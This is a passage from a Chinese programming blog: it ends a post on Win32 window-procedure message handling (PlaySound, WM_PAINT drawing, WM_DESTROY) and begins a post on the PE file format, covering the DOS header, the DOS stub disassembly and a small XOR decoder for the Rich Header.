<p>但是从DisPatchMessage(&amp;msg)到操作系统调用WndProc,中间出现了一个断层,看不到中间的过程心里总是发慌.</p>
<p>并且TranslateMessage(&amp;msg)干了啥也不知道.</p>
<p>调用WndProc有没有创建新进程呢?目前感觉没有,基于两点推测,</p>
<p>一是两个进程的虚拟地址空间独立,不方便WndProc修改窗口参数.</p>
<p>二是刚才已经了解到<code>DisPatchMessage-&gt;操作系统相关函数-&gt;WndProc-&gt;操作系统相关函数-&gt;DispatchMessage</code>这个过程只涉及到控制的转移,看来只是函数调用和返回,不涉及到开新进程</p>
<p>怎么解决这些问题呢?动态调试or看源代码,但不是现在</p>
<h4 id="消息分拣与处理">消息分拣与处理</h4>
<p>消息处理的过程,就是switch-case分拣和就事论事的过程,其要求是:</p>
<p>如果switch-case可以捕获该消息种类并进行处理,那么处理后返回0</p>
<p>否则,即switch-case处理不了这种消息,则应该把处理消息的皮球踢给叫DefWindowProc的系统函数.然后WndProc返回DefWindowProc的返回值</p>
<blockquote>
<p>就好比要吃核桃的时候先用手拨,不行就用牙咬,再不行就用脚踩,要是还不行就只能把核桃交给核桃钳了.</p>
<p>这就好比消息先让WndProc中的switch-case尝试处理,处理不动就交给DefWindowProc进行处理</p>
<p>但是不管用什么方法,最终核桃都要进入人的嘴里</p>
<p>就好比不管谁处理的消息,最终都要经过WndProc返回</p>
</blockquote>
<p>例程是严格遵守这个顺序的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (message)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_CREATE:<span class="comment">//第一次尝试</span></span><br><span class="line">       ...</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//若能处理则返回0</span></span><br><span class="line">    <span class="keyword">case</span> WM_PAINT:<span class="comment">//第二次尝试</span></span><br><span class="line">       ...</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> WM_DESTROY:<span class="comment">//第三次尝试</span></span><br><span class="line">       ...</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//实在能力有限,处理不了,把瓷器活交给金刚钻</span></span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);<span class="comment">//返回DefWindowProc的返回值</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这些消息处理感觉就类似于HTML中的onClick,onload等事件处理函数</p>
<p>onload等事件处理函数一般会赋一个javascript脚本的函数,这个js函数负责修改HTML元素,给用户的感觉就是页面会动态改变</p>
<p>类比到win32编程</p>
<p>case WM_CREATE:这句话就相当于onLoad,</p>
<p>case块里的内容就相当于onLoad=等号后面挂钩的js函数</p>
</blockquote>
<h4 id="播放音频">播放音频</h4>
<p>消息分拣的第一次尝试</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">       PlaySound(TEXT(<span class="string">&quot;SenbonZakura.wav&quot;</span>), <span class="literal">NULL</span>, SND_FILENAME | SND_ASYNC);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>如果该消息是 窗口创建,则捕获该消息.</p>
<p>怎么处理的呢?听首千本樱吧,当前exe文件同目录下找一个叫SenbonZakura.wav的音频文件.</p>
<p><code>PlaySound</code>函数的实现在<code>winmm.lib</code>静态库中,因此在编译的时候要加上<code>-lwinmm</code>选项<code>gcc main.c -O0 -o main -m32 -mwindows -lwinmm</code></p>
<p>单凭这个静态库就知道PlaySound是个很老狠不中用的函数了,甚至都没必要制作成动态库函数.</p>
<p>上网一查API,果然,它只能播放.wav格式的音频文件.怪不得我一开始让他放<code>SenbonZakura.mp3</code>,他不吱声,真的太逊了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">PlaySound</span><span class="params">(</span></span><br><span class="line"><span class="params">   LPCTSTR pszSound,</span></span><br><span class="line"><span class="params">   HMODULE hmod,</span></span><br><span class="line"><span class="params">   DWORD   fdwSound</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>第一个参数是资源名,第二个参数目前认为NULL就可以</p>
<p>还有一件事,听歌的时候程序是卡在这句话等着呢,还是立刻返回呢.</p>
<p>如果一直卡着显然不能及时处理下一条消息.并且实际应用比如植物大战僵尸中,音乐都是当作bgm和战斗并行的.</p>
<p>这玩意怎么实现的呢?通过第三个参数</p>
<p>fdwSound枚举值</p>
<blockquote>
<p><strong>SND_ALIAS</strong>
pszSound参数指定了注册表或WIN.INI中的系统事件的别名。</p>
<p><strong>SND_ALIAS_ID</strong>
pszSound参数指定了预定义的声音标识符。</p>
<p><strong>SND_ASYNC</strong>
用异步方式播放声音，PlaySound函数在开始播放后立即返回。</p>
<p><strong>SND_FILENAME</strong> pszSound参数指定了WAVE文件名。</p>
<p><strong>SND_LOOP</strong>
重复播放声音，必须与SND_ASYNC标志一块使用。</p>
<p><strong>SND_MEMORY</strong>
播放载入到内存中的声音，此时pszSound是指向声音数据的指针。</p>
<p><strong>SND_NODEFAULT</strong>
不播放缺省声音，若无此标志，则PlaySound在没找到声音时会播放缺省声音。</p>
<p><strong>SND_NOSTOP</strong>
PlaySound不打断原来的声音播出并立即返回FALSE。</p>
<p><strong>SND_NOWAIT</strong>
如果驱动程序正忙则函数就不播放声音并立即返回。</p>
<p><strong>SND_PURGE</strong>
停止所有与调用任务有关的声音。若参数pszSound为NULL，就停止所有的声音，否则，停止pszSound指定的声音。</p>
<p><strong>SND_RESOURCE</strong>
pszSound参数是WAVE资源的标识符，这时要用到hmod参数。</p>
<p><strong>SND_SYNC</strong>
同步播放声音，在播放完后PlaySound函数才返回。</p>
<p><strong>SND_SYSTEM</strong>
如果是背景窗口,当这个标志被设置，声音是分配到音频会议系统通知的声音。系统音量控制程序(sndvol)显示音量滑块控制系统通知的声音。设置该标志将下控制音量滑块。如果没有设置该标志，声音是分配到默认的音频会议的应用进程。</p>
</blockquote>
<p>例程中这个参数为<code>SND_FILENAME | SND_ASYNC</code></p>
<p>意思是第一个参数指定的是一个<code>wav</code>资源名,第二个参数意思是异步播放,即<code>PlaySound</code>执行后立刻返回,音乐异步播放</p>
<h4 id="重绘客户区">重绘客户区</h4>
<p><code>CreateWindow</code>之后,只是在内存中为窗口分配了空间,不能显示窗口</p>
<p><code>ShowWindow</code>显示<code>CreateWindow</code>在内存中存好的窗口,此后的更新它不知道</p>
<p>如果此后客户区有更新,需要更新客户区,否则还是显示之前的页面</p>
<p>窗口的客户区是会经常发生变动的,比如缩放调整,最小化,最大化等变化.每次变化后都需要及时重绘客户区</p>
<p>还是看看例程中的方法吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HDC hdc;</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line">RECT rect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">    hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line"></span><br><span class="line">    GetClientRect(hwnd, &amp;rect);</span><br><span class="line"></span><br><span class="line">    DrawText(hdc, TEXT(<span class="string">&quot;Hello, Windows 98!&quot;</span>), <span class="number">-1</span>, &amp;rect,</span><br><span class="line">        DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br><span class="line">    EndPaint(hwnd, &amp;ps);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>起于BeginPaint,终于EndPaint,夹在中间的逻辑就是重绘</p>
<h5 id="beginpaint">BeginPaint</h5>
<p>BeginPaint会将客户区的背景擦除,使用注册窗口类WNDCLASS时的hbrBackground画刷,当时我们是这样规定这个值的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);</span><br></pre></td></tr></table></figure>
<p>即一个库存的白色的画刷</p>
<p>BeginPaint使能客户区,<strong>告诉操作系统</strong>,要向显卡输出了,把本次(其余BeginPaint终于EndPaint)的输出放在显示队列里</p>
<p>返回一个设备环境句柄hdc,啥叫设备环境句柄呢?</p>
<p>hdc就对应窗口客户区那块显示屏,对hdc瞎折腾都不会超过客户区的范围,不会说画出去</p>
<h5 id="getclientrect">GetClientRect</h5>
<p>第一个参数,窗口句柄,例程中的hwnd来自WndProc函数,该函数由操作系统调用,hwnd就是消息发生所在的窗口</p>
<p>第二个参数,RECT类型,矩形结构指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRECT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LONG    left;<span class="comment">//左边界</span></span><br><span class="line">    LONG    top;<span class="comment">//上边界</span></span><br><span class="line">    LONG    right;<span class="comment">//右边界</span></span><br><span class="line">    LONG    bottom;<span class="comment">//下边界</span></span><br><span class="line">&#125; RECT, *PRECT, NEAR *NPRECT, FAR *LPRECT;</span><br></pre></td></tr></table></figure>
<p>其中left和top总是置0,此时right和bottom分别以像素为单位表示客户区高度和宽度</p>
<p>注意到rect传递的是引用,也就是说GetClientRect将会改变这个值.</p>
<p>该函数会获取客户区的大小,写道第二个参数指定的结构体中</p>
<p>为啥要获取客户区大小呢?为下面重绘做准备.经过窗口缩放等改变,客户区显然会变,因此需要重新量身定做</p>
<h5 id="drawtext">DrawText</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">DrawText</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HDC     hdc,</span></span><br><span class="line"><span class="params">  [in, out] LPCTSTR lpchText,</span></span><br><span class="line"><span class="params">  [in]      <span class="type">int</span>     cchText,</span></span><br><span class="line"><span class="params">  [in, out] LPRECT  lprc,</span></span><br><span class="line"><span class="params">  [in]      UINT    format</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DrawText(hdc, TEXT(<span class="string">&quot;Hello, Windows 98!&quot;</span>), <span class="number">-1</span>, &amp;rect,</span><br><span class="line">    DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br></pre></td></tr></table></figure>
<p>绘制文本,向hdc句柄对应的区域,打印"Hello,Windows
98!",-1表示该字符串以0结尾.</p>
<p>第四个参数是刚从GetClientRect获得客户区信息的矩形结构体,要打印的字符串将放在啊矩形中</p>
<p>至于是居中居左等样式信息,还要取决于第五个参数</p>
<table>
<colgroup>
<col style="width: 20%" />
<col style="width: 80%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Value</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;"><strong>DT_BOTTOM</strong></td>
<td style="text-align: left;">Justifies the text to the bottom of the
rectangle. This value is used only with the DT_SINGLELINE value.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>DT_CALCRECT</strong></td>
<td style="text-align: left;">Determines the width and height of the
rectangle. If there are multiple lines of text,
<strong>DrawText</strong> uses the width of the rectangle pointed to by
the <em>lpRect</em> parameter and extends the base of the rectangle to
bound the last line of text. If the largest word is wider than the
rectangle, the width is expanded. If the text is less than the width of
the rectangle, the width is reduced. If there is only one line of text,
<strong>DrawText</strong> modifies the right side of the rectangle so
that it bounds the last character in the line. In either case,
<strong>DrawText</strong> returns the height of the formatted text but
does not draw the text.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>DT_CENTER</strong></td>
<td style="text-align: left;">文字居中</td>
</tr>
<tr>
<td style="text-align: left;">...</td>
<td style="text-align: left;">...</td>
</tr>
</tbody>
</table>
<p>例程中使用的是<code>DT_SINGLELINE | DT_CENTER | DT_VCENTER</code>,单行,水平居中,垂直居中</p>
<h5 id="endpaint">EndPaint</h5>
<p>配合BeginPaint使用,这样一对函数的参数必须相同,夹紧一个窗口的变化</p>
<h4 id="关闭窗口">关闭窗口</h4>
<p>当点击窗口右上角的❌,企图关闭窗口时,该消息发出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">    PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>例程中的处理方法是调用函数<code>PostQuitMessage(0)</code></p>
<p>其功能是将WM_QUIT消息插入线程的消息队列.</p>
<p>而消息循环的判断函数GetMessage,唯独对于WM_QUIT返回0,</p>
<p>当消息循环取出该消息时,GetMessage返回0,判断失败,不进入循环,WinMain结束.线程结束</p>
<h3 id="程序返回">程序返回</h3>
<p>只有当消息循环接收到WM_QUIT时,才会跳出循环,此时WinMain寿终正寝了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> msg.wParam;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/07/14/PE%E7%A8%8B%E5%BA%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/14/PE%E7%A8%8B%E5%BA%8F/" class="post-title-link" itemprop="url">程序员的自我修养 chapter 5 PE/COFF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-14 23:44:00" itemprop="dateCreated datePublished" datetime="2022-07-14T23:44:00+08:00">2022-07-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-09-25 19:37:48" itemprop="dateModified" datetime="2023-09-25T19:37:48+08:00">2023-09-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="portable-executable">Portable Executable</h1>
<h2 id="前置知识">前置知识</h2>
<h3 id="notepad.exe-on-winxp">notepad.exe on winXP</h3>
<p>首先,win11上的notepad.exe和winXP上的notepad.exe不一样</p>
<p>左是winxp上的notepad.exe,右是win11上的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710191351701.png"
alt="image-20220710191351701" />
<figcaption aria-hidden="true">image-20220710191351701</figcaption>
</figure>
<p>方便获取核心原理的讲解,还是使用winxp的notepad.exe</p>
<p>直接从虚拟机拽到win11上用010editor分析就可以</p>
<h3 id="pe文件">PE文件</h3>
<p>windows上的目标文件叫做PE</p>
<blockquote>
<p>可执行的有.exe,.src(即可执行目标模块,类似于linux上的.out)</p>
<p>库文件有.dll等(动态库,类似于linux上的.so)</p>
<p>驱动程序有.sys等</p>
<p>对象文件有.obj(即可重定位目标模块,类似于linux上的.o文件)</p>
</blockquote>
<p>PE文件可以分成两部分,头和身子</p>
<p>头就是PE头,身子就是各节区内容</p>
<p>PE在磁盘中存放时的状态和运行时加载进入虚拟内存的状态不完全相同</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710112514843.png"
alt="image-20220710112514843" />
<figcaption aria-hidden="true">image-20220710112514843</figcaption>
</figure>
<h3
id="虚拟地址相对虚拟地址映像基址文件偏移">虚拟地址,相对虚拟地址,映像基址,文件偏移</h3>
<p>一些符号约定,后面会推导这些量的转化关系</p>
<p>VA(Virtual Address):虚拟地址空间中的地址</p>
<p><code>RVA(Relative Virtual Address)</code>:相对虚拟地址,相对于虚拟地址空间中基地址的偏移量</p>
<p>ImageBase:进程映像在虚拟地址空间中的基地址</p>
<p>关系:<span class="math inline">\(VA=RVA+ImageBase\)</span></p>
<p>文件中保存的都是RVA,实际运行时需要选定一个ImageBase,其他RVA地址基于该ImageBase计算得到运行时的虚拟地址.</p>
<p>RAW:文件偏移,符号在磁盘文件中躺着时,相对于文件开始的偏移量</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">RAW</span><span class="punctuation">(</span><span class="variable">x</span><span class="punctuation">)</span><span class="operator">=</span><span class="variable">RVA</span><span class="punctuation">(</span><span class="variable">x</span><span class="punctuation">)</span><span class="operator">-</span><span class="variable">section</span><span class="punctuation">[</span><span class="variable">i</span><span class="punctuation">]</span><span class="operator">.</span><span class="variable">VirtualAddress</span><span class="operator">+</span><span class="variable">section</span><span class="punctuation">[</span><span class="variable">i</span><span class="punctuation">]</span><span class="operator">.</span><span class="variable">PointerToRawData</span></span><br></pre></td></tr></table></figure>
<h2 id="pe头">PE头</h2>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/test/master/PE%E5%A4%B4.png" /></p>
<h3 id="dos头">DOS头</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710193646618.png"
alt="image-20220710193646618" />
<figcaption aria-hidden="true">image-20220710193646618</figcaption>
</figure>
<p>DOS头的最后一个成员是AddressOfNewExeHeader,其值是NT头相对于本文件开始的偏移量</p>
<p>可以看到NotePad.exe中其值为E8h,而本文件的E8h处正好就是NtHeader的起始地址</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710205215866.png"
alt="image-20220710205215866" />
<figcaption aria-hidden="true">image-20220710205215866</figcaption>
</figure>
<p>为啥要设置这么一个值呢?</p>
<p>因为DOS头和NtHeader之间有一个DOS桩,如果这个DOS桩也是定长的,则显然不需要记录Nt头的偏移量</p>
<p>然而DOS桩长度可变,因此为了定位Nt头需要专门记录一下</p>
<p>为啥不在DOS桩里面记录Nt头的位置?DOS桩只有在DOS环境下才会执行,桌面环境下轮不到DOS桩执行</p>
<h3 id="dos桩">DOS桩</h3>
<blockquote>
<p>桩,存根, 占位代码，粘合代码，残存代码,
指满足形式要求但没有实现实际功能的占坑/代理代码。</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710193746654.png"
alt="image-20220710193746654" />
<figcaption aria-hidden="true">image-20220710193746654</figcaption>
</figure>
<p>32位PE程序中,由于DOS头是定长的,因此从40h开始是DOS桩,而DOS桩不一定是定长的</p>
<p>winXP上的notepad.exe,其dos桩长度为90h</p>
<p>DOS桩是干啥的呢?在DOS环境下执行PE程序会执行DOS桩内的指令,而不是执行正儿八经的PE程序</p>
<p>为啥呢?DOS环境是16位的,并且没有GUI,当然跑不起来正儿八经的记事本了.</p>
<p>既然DOS桩也可以执行,那么它干了啥事呢?</p>
<p>将DOS桩提出来用ida 16位反编译</p>
<p>发现前D个字节确实可以反汇编成指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">seg000:0000 0E                       push    cs</span><br><span class="line">seg000:0001 1F                       pop     ds</span><br><span class="line">seg000:0002 BA 0E 00                 mov     dx, 0Eh</span><br><span class="line">seg000:0005 B4 09                    mov     ah, 9</span><br><span class="line">seg000:0007 CD 21                    int     21h             ; DOS - PRINT STRING</span><br><span class="line">seg000:0007                                                  ; DS:DX -&gt; string terminated by &quot;$&quot;</span><br><span class="line">seg000:0009 B8 01 4C                 mov     ax, 4C01h</span><br><span class="line">seg000:000C CD 21                    int     21h             ; DOS - 2+ - QUIT WITH EXIT CODE (EXIT)</span><br><span class="line">seg000:000C                                                  ; AL = exit code</span><br></pre></td></tr></table></figure>
<p>此后紧跟着就是有实际意义的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seg000:000E aThisProgramCan db &#x27;This program cannot be run in DOS mode.&#x27;,0Dh,0Dh,0Ah</span><br><span class="line">seg000:000E                 db &#x27;$&#x27;,0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意到字符串下面有一个美元符号'$',它也是有作用的,后面就知道了</p>
</blockquote>
<p>那么这前D个字节的指令干了啥事呢</p>
<p>首先将cs拷贝给ds,然后将<code>This program cannot be run in DOS mode.$</code>这个字符串的起始地址0Eh放到dx中,目的是为后来的函数调用做准备</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seg000:0000 0E                       push    cs</span><br><span class="line">seg000:0001 1F                       pop     ds</span><br><span class="line">seg000:0002 BA 0E 00                 mov     dx, 0Eh</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为啥要把cs拷贝给ds呢?因为这时候cs段寄存器存放的就是当前正在执行的代码段的起始地址,</p>
<p>后面的字符串虽然是数据,但是也是存放在当前代码段的,</p>
<p>访问数据要使用ds:dx两个寄存器,</p>
<p>要想指向这个字符串,ds需要等于字符串的段地址,也就是cs</p>
</blockquote>
<p>然后<code>ah=9h</code>决定<code>int 21h</code>做什么工作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seg000:<span class="number">0005</span> B4 <span class="number">09</span>                    mov     ah, <span class="number">9</span></span><br><span class="line">seg000:<span class="number">0007</span> CD <span class="number">21</span>                    <span class="type">int</span>     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br></pre></td></tr></table></figure>
<p>当<code>AH=9</code>的时候,<code>int 21h</code>显示字符串,将<code>DS:DX</code>开始的字符串一直<strong>打印到<code>$</code>结束</strong></p>
<p>然后<code>4c01h</code>放在<code>ax</code>中,再次决定<code>int 21h</code>做什么工作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seg000:0009 B8 01 4C                 mov     ax, 4C01h</span><br><span class="line">seg000:000C CD 21                    int     21h             ; DOS - 2+ - QUIT WITH EXIT CODE (EXIT)</span><br></pre></td></tr></table></figure>
<p>当<code>ah=4c</code>时,<code>int 21h</code>决定带返回码返回,返回码就放在<code>al</code>中,显然这里是<code>01h</code></p>
<p>现在DOS桩的逻辑弄明白了,但是但是,代码和数据只是占了一小部分,桩后半部分那些乱码是啥呢?</p>
<p>010editor给出了一些线索</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710200602144.png"
alt="image-20220710200602144" />
<figcaption aria-hidden="true">image-20220710200602144</figcaption>
</figure>
<p>DOS桩剩下这一部分叫做Rich Header,</p>
<p>单凭其最后一个成员XorKey,一个异或钥匙,就知道这rich_header玩意儿应该是加密的,</p>
<p>既然给了异或钥匙,直接解密试试</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="title class_">ElemType</span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">4</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> value;</span><br><span class="line">    <span class="built_in">ElemType</span>()&#123;</span><br><span class="line">        value=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ElemType</span>(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> &amp;i)&#123;</span><br><span class="line">        value=i;</span><br><span class="line">    &#125;</span><br><span class="line">    ElemType <span class="keyword">operator</span>=(<span class="type">const</span> ElemType &amp;e)&#123;</span><br><span class="line">        value=e.value;</span><br><span class="line">        <span class="keyword">return</span> (*<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os,<span class="type">const</span> ElemType &amp;e)&#123;</span><br><span class="line">        cout&lt;&lt;hex&lt;&lt;e.value&lt;&lt;<span class="string">&quot;   &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)&#123;</span><br><span class="line">            os&lt;&lt;e.str[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> <span class="keyword">operator</span>^=(<span class="type">const</span> ElemType &amp;e)&#123;</span><br><span class="line">        value^=e.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">ElemType data[<span class="number">17</span>] = &#123;</span><br><span class="line">    <span class="number">0x9B166DA5</span>, <span class="number">0xC8780CE1</span>, <span class="number">0xC8780CE1</span>, <span class="number">0xC8780CE1</span>, <span class="number">0xC8382F1B</span>, <span class="number">0xC8780CE0</span>, <span class="number">0xC8780CE1</span>, <span class="number">0xC8780CE0</span>, </span><br><span class="line">    <span class="number">0xC8612F1B</span>, <span class="number">0xC8780CF2</span>, <span class="number">0xC8790CE1</span>, <span class="number">0xC8780C23</span>, <span class="number">0xC83D2F76</span>, <span class="number">0xC8780CE0</span>, <span class="number">0xC8642F3B</span>, <span class="number">0xC8780CF2</span>, </span><br><span class="line">    <span class="number">0xC8452F1B</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key=<span class="number">0xC8780CE1</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">17</span>;++i)&#123;</span><br><span class="line">        data[i]^=key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">17</span>;++i)&#123;</span><br><span class="line">        cout&lt;&lt;data[i]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
